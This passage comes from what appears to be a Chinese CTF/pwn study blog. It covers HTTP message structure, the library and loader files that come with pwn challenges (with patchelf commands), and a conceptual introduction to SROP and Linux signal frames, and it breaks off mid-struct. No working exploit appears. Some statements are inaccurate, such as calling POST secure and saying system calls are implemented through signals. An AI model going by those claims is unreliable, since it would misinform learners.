<li>例如：GET  /test/test.html  HTTP/1.1</li>
<li>GET 为请求方式，请求方式分为：Get（默认）、POST、DELETE、HEAD等<ul>
<li>GET：明文传输 不安全，数据量有限，不超过1kb</li>
<li>POST：暗文传输，安全，数据量没有限制</li>
</ul>
</li>
<li>/test/test.html 为URI，统一资源标识符</li>
<li>HTTP/1.1 为协议版本</li>
</ul>
</li>
<li><p>请求消息头：从第二行开始到空白行统称为请求消息头</p>
<ul>
<li>Accept：浏览器可接受的MIME类型告诉服务器客户端能接收什么样类型的文件</li>
<li>Accept-Charset：浏览器通过这个头告诉服务器，它支持哪种字符集</li>
<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如 gzip</li>
<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到，可以在浏览器中进行设置</li>
<li>Host：初始URL中的主机和端口</li>
<li>Referrer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
<li>Content-Type：内容类型告诉服务器浏览器传输数据的MIME类型，文件传输的类型</li>
<li>If-Modified-Since：利用这个头与服务器的文件进行比对，如果一致，则从缓存中直接读取文件</li>
<li>User-Agent：浏览器类型</li>
<li>Content-Length：表示请求消息正文的长度</li>
<li>Connection：表示是否需要持久连接。如果服务器看到这里的值为“Keep -Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接）</li>
<li>Cookie：用于分辨两个请求是否来自同一个浏览器，以及保存一些状态信息</li>
<li>Date：请求时间GMT</li>
</ul>
</li>
<li><p>消息正文：当请求方式是[POST]方式时，才能看见消息正文，消息正文就是要传输的一些数据，如果没有数据需要传输时，消息正文为空</p>
</li>
</ul>
<h2 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h2><p>一般的响应如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK <span class="comment">&lt;!-- 响应消息行 --&gt;</span></span><br><span class="line">Server: Tiny Web Server <span class="comment">&lt;!-- 响应消息头 --&gt;</span></span><br><span class="line">Content-length: 120</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 响应正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>响应消息行：第一行响应消息为响应消息行<ul>
<li>例如：HTTP/1.0 200 OK</li>
<li>HTTP/1.0 为协议版本</li>
<li>200 为响应状态码，常用的响应状态码有40余种，这里我们仅列出几种，详细请看：<ul>
<li>200：一切正常</li>
<li>302/307：临时重定向</li>
<li>304：未修改，客户端可以从缓存中读取数据，无需从服务器读取</li>
<li>404：服务器上不存在客户端所请求的资源</li>
<li>500：服务器内部错误</li>
</ul>
</li>
<li>OK 为状态码描述</li>
</ul>
</li>
<li>响应消息头：<ul>
<li>Location：指示新的资源的位置通常和302/307一起使用，完成请求重定向</li>
<li>Server：指示服务器的类型</li>
<li>Content-Encoding：服务器发送的数据采用的编码类型</li>
<li>Content-Length：告诉浏览器正文的长度</li>
<li>Content-Language：服务发送的文本的语言</li>
<li>Content-Type：服务器发送的内容的MIME类型</li>
<li>Last-Modified：文件的最后修改时间</li>
<li>Refresh：指示客户端刷新频率，单位是秒</li>
<li>Content-Disposition：指示客户端下载文件</li>
<li>Set-Cookie：服务器端发送的Cookie</li>
<li>Expires：-1</li>
<li>Cache-Control：no-cache (1.1)  </li>
<li>Pragma：no-cache   (1.0)  表示告诉客户端不要使用缓存</li>
<li>Connection：close/Keep-Alive   </li>
<li>Date：请求时间</li>
</ul>
</li>
<li>响应正文：即网页的源代码（F12可查看）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">解析pwn题中附带的文件（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-01 02:19:14" itemprop="dateCreated datePublished" datetime="2022-01-01T02:19:14+08:00">2022-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-07 21:18:58" itemprop="dateModified" datetime="2022-01-07T21:18:58+08:00">2022-01-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="解析pwn题中附带的文件"><a href="#解析pwn题中附带的文件" class="headerlink" title="解析pwn题中附带的文件"></a>解析pwn题中附带的文件</h2><img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640939836621.png" class width="1640939836621"> 
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640939961296.png" class width="1640939961296"> 
<p>环境对pwn题至关重要，有时候本地打不通但服务器可以打通，有时候却恰恰相反，这些都与pwn题的环境有关</p>
<p>在一个pwn题中，除了有一个服务器上的样本文件以外，还有一些其他文件</p>
<p>这些文件就是题目作者交给我们的“题目环境”</p>
<p>我已经在“题目环境”这一块吃了不少亏了，主要是不知道这些文件是干什么的，又或许不明白这些文件的用法，所以我打算学习一下这些文件的用途，在此记录</p>
<hr>
<h2 id="libc-so"><a href="#libc-so" class="headerlink" title="libc.so"></a>libc.so</h2><p><strong>libc.so</strong>是glibc库的软链接，一般为 <strong>libc.so.6</strong> ，一个类似于WINDOWS下的一个快捷指向型的文件</p>
<p>但是pwn题中给的<strong>libc.so.6</strong>可不是软链接，而是glibc库本身</p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640941622614.png" class width="1640941622614"> 
<p>软链接 <strong>libc.so.6</strong> 所链接的glibc就是“/lib/i386-linux-gnu”中的 <strong>libc.so.6</strong> </p>
<p>​        //在本机进行操作时，程序会默认<strong>libc.so.6</strong>为glibc库，但题目文件是不是这个库就不一定了</p>
<p>如果pwn题给出了glibc库那就简单了，可以直接用ELF模块引入</p>
<h2 id="ld-linux-so"><a href="#ld-linux-so" class="headerlink" title="ld-linux.so"></a>ld-linux.so</h2><p>当操作系统加载一个动态链接的应用程序时，它必须找到并加载它执行该应用程序所依赖的<strong>动态库</strong>（以so为后缀的文件），而 <strong>ld-linux.so</strong> 是链接器的运行时的组件，是专门负责寻找库文件的库，ld-linux.so将按一定顺序找到libc.so.6库再给cat调用</p>
<p>​        // ld-linux.so的位置是写死在程序中的，gcc在编译程序时就写死在里面了 </p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640971840935.png" class width="1640971840935"> 
<p>程序默认的 <strong>ld-linux.so</strong> 就是“/lib/i386-linux-gnu”中的 <strong>ld-linux.so.2</strong></p>
<p>如果pwn题给出了ld-linux.so，那么它一定在链接器上动了手脚，需要用<strong>patchelf</strong>修改链接器组件为题目给出的ld-linux.so，以保证环境一致</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter /lib/my-ld-linux.so<span class="number">.2</span> my-program</span><br><span class="line"><span class="comment">#&#x27;/lib/my-ld-linux.so.2&#x27;：ld-linux.so文件的路径</span></span><br><span class="line"><span class="comment">#&#x27;my-program&#x27;：pwn题样本文件的名称</span></span><br></pre></td></tr></table></figure>
<h2 id="libc-A-BC-so"><a href="#libc-A-BC-so" class="headerlink" title="libc-A.BC.so"></a>libc-A.BC.so</h2><p><strong>libc-A.BC.so</strong> 和 <strong>libc.so.6</strong> 是同一个东西（都是glibc共享库）</p>
<p>只不过<strong>libc-A.BC.so</strong>的命名方式更加规范：</p>
<p>lib表示库文件，so表示动态链接，A为主版本号，B为次版本号，C为发布版本号</p>
<p>标准命名可以方便pwn手一下子定位libc版本，但是有些pwn题为了隐藏libc版本，就故意把glibc库文件统一命名为libc.so.6</p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640973216192.png" class width="1640973216192"> 
<p>如果pwn题给出了libc-A.BC.so，那就连libc版本都不用测了，直接用<strong>patchelf</strong>改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf ./my-program --replace-needed libc.so<span class="number">.6</span> ./other-libs</span><br><span class="line"><span class="comment">#&#x27;/other-libs&#x27;：设置rpath的路径</span></span><br><span class="line"><span class="comment">#&#x27;my-program&#x27;：pwn题样本文件的名称</span></span><br></pre></td></tr></table></figure>
<p>程序会优先从rpath中获取程序的glibc库</p>
<h2 id="ld-A-BC-so"><a href="#ld-A-BC-so" class="headerlink" title="ld-A.BC.so"></a>ld-A.BC.so</h2><p><strong>ld-A.BC.so</strong> 和 <strong>ld-linux.so</strong> 是同一个东西（都是链接器组件）</p>
<p>ld表示链接器组件，so表示动态链接，A为主版本号，B为次版本号，C为发布版本号</p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640973934926.png" class width="1640973934926"> 
<p>同样，用<strong>patchelf</strong>修改链接器组件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter /lib/my-ld-linux.so<span class="number">.2</span> my-program</span><br></pre></td></tr></table></figure>
<h2 id="libseccomp-so"><a href="#libseccomp-so" class="headerlink" title="libseccomp.so"></a>libseccomp.so</h2><p>这个就比较高端了，<strong>seccomp</strong> 又被称为沙盒，是一种保护机制</p>
<p><strong>libseccomp</strong> 是一个 C 语言开发的 Linux 内核系统调用过滤帮助库，很多容器项目都使用到它，比如 containerd、docker、runc </p>
<p><strong>libseccomp.so</strong> 就是 libseccomp 所使用的动态链接</p>
<p><strong>libseccomp.so.2</strong> 就是 <strong>libseccomp.so</strong> 的常用版本，如果pwn题中出现了libseccomp.so.2，就说明它开了沙盒的</p>
<p>如果只是单纯的ROP题目，libseccomp.so.2可有可无，因为有专门的工具用于检查沙盒，但是如果题目设计到 <strong>堆</strong> 就不同了，如果使用了 libseccomp.so.2 来开保护沙盒，那么会在程序中创建各个堆块，这可能会导致远程和本地的堆空间的布局不一致 </p>
<p>目前没有找到什么解决的办法</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">SignalFrame分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-29 01:36:08" itemprop="dateCreated datePublished" datetime="2021-12-29T01:36:08+08:00">2021-12-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 14:38:05" itemprop="dateModified" datetime="2023-04-02T14:38:05+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SignalFrame分析"><a href="#SignalFrame分析" class="headerlink" title="SignalFrame分析"></a>SignalFrame分析</h2><p><strong>————深入理解SROP和系统调用</strong></p>
<p><strong>SROP</strong> 也即Sigreturn Oriented Programming，是一种基于 <strong>signal机制</strong> 进行攻击的高级ROP利用手段，通过覆盖 <strong>Signal Frame</strong> 上的关键数据来控制 <strong>sigreturn</strong>，从而达到漏洞利用的效果</p>
<p>我在学习<strong>SROP</strong>的过程中，发现了一道设计巧妙的题目，我在分析了其他师傅的WP后，又去了解了一下<strong>SROP</strong>背后的原理，于是想记录一下，做个总结</p>
<hr>
<h2 id="前言-中断流程-amp-分类"><a href="#前言-中断流程-amp-分类" class="headerlink" title="前言-中断流程&amp;分类"></a>前言-中断流程&amp;分类</h2><p>中断是计算机程序中的一种机制，用于处理一些需要及时处理的情况</p>
<p>一，中断流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">中断请求 &gt;&gt; CPU识别 &gt;&gt; 中断判优 &gt;&gt; 保存信息 &gt;&gt; 跳转中断处理程序 &gt;&gt; 返回复原</span><br></pre></td></tr></table></figure>
<p>1.中断请求：程序可以利用指令进行中断请求，而一些被检测出来的错误也可以触发中断请求</p>
<p>2.CPU识别：CPU是处理中断信息的核心，它负责检测中断请求</p>
<p>3.中断判优：当程序内部出现错误时，必须马上做出响应，所以CPU会检查flag寄存器中的“TP位”和“IF位”来获取中断的信息，以便判断哪些响应是紧急的，哪些又是可以不响应的</p>
<p>4.保存信息：在进行响应前，内核会帮用户进程将其上下文保存在该进程的栈中</p>
<p>5.跳转中断处理程序：根据中断信息和中断向量表找到对应的中断处理程序</p>
<p>6.返回复原：调用函数<strong>Sigreturn</strong>来复原栈空间</p>
<p>二，中断分类：</p>
<p>中断可以根据其中断源和重要程度进行分类，大致有以下3种：</p>
<p>1.内中断和外中断 </p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">外中断：是指来自处理器和内存以外的部件引起的中断，包括<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>设备发出的<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>中断，外部信号中断，以及各种计时器引起的时钟中断等（外中断在狭义上一般被称为中断）</span><br><span class="line"></span><br><span class="line">内中断：主要指在处理器和内存内部产生的中断，包括程序运算引起的各种错误，如地址非法、检验错、页面失效、存储访问控制错、算术操作溢出、数据格式非法、除数为<span class="number">0</span>、非法指令、用户程序执行特权指令、分时操作系统中的时间片中断以及用户态到核心态的切换等</span><br></pre></td></tr></table></figure>
<p>2.硬件中断和软件中断 </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">硬件中断：通过外部的硬件产生的中断（硬件中断属于外中断）</span><br><span class="line"></span><br><span class="line">软件中断：通过某条指令产生的中断，这种中断可以编程实现（软件中断属于内中断）</span><br></pre></td></tr></table></figure>
<p>3.非屏蔽中断和可屏蔽中断（全是外中断） </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">非屏蔽中断：非屏蔽中断是一种硬件中断，此种中断通过不可屏蔽中断请求NMI控制，不受中断标志位<span class="keyword">IF</span>的影响，即使关中断（<span class="attribute">IF</span>=0）的情况下也会被响应</span><br><span class="line"></span><br><span class="line">可屏蔽中断：可屏蔽中断也是一种硬件中断，此种中断通过中断请求标记触发器INTR控制，且受中断标志位<span class="keyword">IF</span>的影响，在关中断情况下不接受中断请求</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fengfeng0328/article/details/83318000（更详细）">https://blog.csdn.net/fengfeng0328/article/details/83318000（更详细）</a></p>
<hr>
<h2 id="前言-系统调用"><a href="#前言-系统调用" class="headerlink" title="前言-系统调用"></a>前言-系统调用</h2><p><strong>什么是系统调用？</strong></p>
<p>由操作系统提供的供所有系统调用的<strong>程序接口集合</strong></p>
<p>用户程序通常只在 <strong>用户态</strong> 下运行，当用户程序想要调用只能在 <strong>内核态</strong> 运行的子程序时，所以操作系统需要提供 <strong>访问这些内核态</strong> 运行的程序的接口，这些接口的集合就叫做系统调用，简要的说，系统调用是内核向用户进程提供服务的唯一方法<br>用户程序通过系统调用从用户态（user mode）切换到核心态（ kernel mode ），从而可以访问相应的资源。这样做的好处是：</p>
<ul>
<li>为用户空间提供了一种硬件的抽象接口，使编程更加容易</li>
<li>有利于系统安全</li>
<li>有利于每个进程度运行在虚拟系统中，接口统一有利于移植</li>
</ul>
<p><strong>系统调用的过程</strong></p>
<p>系统调用通过<strong>signal机制</strong>来实现</p>
<p>一般64位系统会用 <strong>syscall</strong>（陷阱）来传递中断信息，而32位系统则会使用 <strong>int n</strong>（中断）</p>
<p>它们都会把系统调用号装入“rax/eax”寄存器，然后把必要的参数装入其他寄存器</p>
<p><strong>系统调用和内核的联系</strong></p>
<p>通常，处理器设有两种模式： <strong>“用户模式”</strong> 与 <strong>“内核模式”</strong> ，通过一个标签位来鉴别当前正处于什么模式</p>
<p>内核模式可以运行所有指令，包括特权指令（主要是一些硬件管理的指令，例如修改基址寄存器内容的指令），而用户模式不能执行特权指令，这样的设计主要为了安全问题，即由操作系统负责管理硬件，避免上层应用因错误设计而导致硬件问题 </p>
<p>而在上文中提及到：有些基于读写的操作必须要在 <strong>“内核模式”</strong> 中完成，而系统调用为了实现这些功能而诞生的，它通过提供 <strong>有权限限制</strong> 的  <strong>“内核模式”</strong> ，来实现一些 <strong>“用户模式”</strong> 无法办到的操作</p>
<p><strong>系统调用和库函数的联系</strong></p>
<p>事实上，系统调用所提供给用户的是直接而纯碎的高级服务，如果想要更加人性化，具有更符合特定情况的功能，那么就要我们用户自己定义，因此衍生了库函数 </p>
<p>库函数把系统调用进行<strong>包装</strong>，使它更方便使用，比如C语言标准库中的“printf”就使用了大量的系统调用，才实现了输出字符串到屏幕的功能</p>
<p>所以系统调用是为了方便使用操作系统的接口，而库函数则是为了人们编程的方便 </p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DurKui/p/15345050.html">https://www.cnblogs.com/DurKui/p/15345050.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8e89b13fac7d">https://www.jianshu.com/p/8e89b13fac7d</a></p>
<hr>
<h2 id="简析Signal机制"><a href="#简析Signal机制" class="headerlink" title="简析Signal机制"></a>简析Signal机制</h2><p>signal机制是类unix系统中进程之间相互传递信息的一种方法，是软件中断的一种</p>
<p>流程如下： </p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640582446513.png" class width="1640582446513"> 
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某个进程发送signal机制 &gt;&gt; 保存上下文 &gt;&gt; signal处理 &gt;&gt; 还原上下文 &gt;&gt; 进行程序</span><br></pre></td></tr></table></figure>
<p>详细来说：</p>
<p>进程发起signal后，先会保存上下文并在<strong>栈顶</strong>添加一个 sigreturn ，然后控制IP指针指向 Siganl Handler，程序执行完成后又会还原上下文，最后控制IP指针返回</p>
<p>​        //这样大规模的读写操作需要更高的权限，所以需要进入<strong>内核态</strong>，由于恢复的任务比较艰巨，系统干脆提供了一个系统调用 <strong>sigreturn</strong></p>
<p><strong>Signal机制</strong>之中有几个重要的概念：</p>
<p>1.sigreturn：一种系统调用，用于还原各个寄存器中的数据</p>
<p>2.ucontext：linux中设计的一种结构体，给用户让渡了一部分控制代码上下文的能力</p>
<p>3.siginfo：一种结构体，用于存储信号的信息</p>
<p>4.Signal Frame：我们称ucontext以及siginfo这一段为Signal Frame </p>
<p><strong>SROP</strong>的核心就是伪造Signal Frame，欺骗程序执行我们需要的代码</p>
<hr>
<h2 id="简析ucontext-amp-siginfo"><a href="#简析ucontext-amp-siginfo" class="headerlink" title="简析ucontext &amp; siginfo"></a>简析ucontext &amp; siginfo</h2><p><strong>ucontext：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> &#123;</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc_link</span>;</span><span class="comment">//指向此上下文返回时，将恢复的上下文的指针   </span></span><br><span class="line">               <span class="keyword">sigset_t</span>         uc_sigmask;<span class="comment">//运行时各个寄存器的值</span></span><br><span class="line">               <span class="keyword">stack_t</span>          uc_stack;<span class="comment">//运行栈</span></span><br><span class="line">               <span class="keyword">mcontext_t</span>       uc_mcontext;<span class="comment">//信号</span></span><br><span class="line">               ...	</span><br><span class="line">           &#125; <span class="keyword">ucontext_t</span>;</span><br></pre></td></tr></table></figure>
<p>结构体ucontext用于保存上下文信息</p>
<p>有了它，许多上下文切换的操作都可以完成，linux也为它提供了一组api：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">getcontext</span><span class="params">(<span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//获取当前上下文</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">setcontext</span><span class="params">(<span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//则是从‘ucp’指向的实例恢复上下文到现场</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makecontext</span><span class="params">(<span class="keyword">ucontext_t</span> *ucp, (<span class="keyword">void</span> *func)(), <span class="keyword">int</span>, ...)</span></span>;</span><br><span class="line"><span class="comment">//可以修改getcontext得到的上下文</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">swapcontext</span><span class="params">(<span class="keyword">ucontext_t</span> *oucp, <span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//调用getcontext到oucp，然后用ucp去setcontext</span></span><br></pre></td></tr></table></figure>
<p>这里就不继续展开了</p>
<p><strong>siginfo：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> si_signo;<span class="comment">// signal number的简写，该变量用来存储信号编号并且恒有值</span></span><br><span class="line">    <span class="keyword">int</span> si_code;<span class="comment">// signal code的简写，可以获取多种变量值</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">sigval</span> <span class="title">si_value</span>;</span><span class="comment">// ignal value的简写，这个变量是一个结构体</span></span><br><span class="line">    <span class="keyword">int</span> si_errno;<span class="comment">// 如果该位不为0，则和信号在一起的有一个错误代码（信号发生错误）</span></span><br><span class="line">    <span class="keyword">pid_t</span> si_pid;<span class="comment">//	发送该信号的进程id</span></span><br><span class="line">    <span class="keyword">uid_t</span> si_uid;<span class="comment">// 发送该信号的用户id</span></span><br><span class="line">    <span class="keyword">void</span> *si_addr;<span class="comment">// 错误发生的地址</span></span><br><span class="line">    <span class="keyword">int</span> si_status;</span><br><span class="line">    <span class="keyword">int</span> si_band;</span><br><span class="line">&#125; <span class="keyword">siginfo_t</span>;</span><br></pre></td></tr></table></figure>
<p>结构体siginfo用于保存signal的各种信息</p>
<p>参考 </p>
<p>ucontext：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a96b31da3ab0">https://www.jianshu.com/p/a96b31da3ab0</a></p>
<p>siginfo：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1009-1803/p/13701754.html">https://www.cnblogs.com/zw1009-1803/p/13701754.html</a></p>
<p>TCP简析：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41877474/article/details/102580825">https://blog.csdn.net/qq_41877474/article/details/102580825</a></p>
<hr>
<h2 id="简析Signal-Frame"><a href="#简析Signal-Frame" class="headerlink" title="简析Signal Frame"></a>简析Signal Frame</h2><p>Signal Frame是由ucontext和siginfo组成的区域，signal中的信息都会存储在这里</p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640703030598.png" class width="1640703030598"> 
<p>其末尾就是<strong>sigreturn</strong>，可以根据Signal Frame在返回原栈帧和原寄存器数据</p>
<p>Signal Frame的结构在32位系统和64位系统中有些许不同：</p>
<p><strong>x86</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span 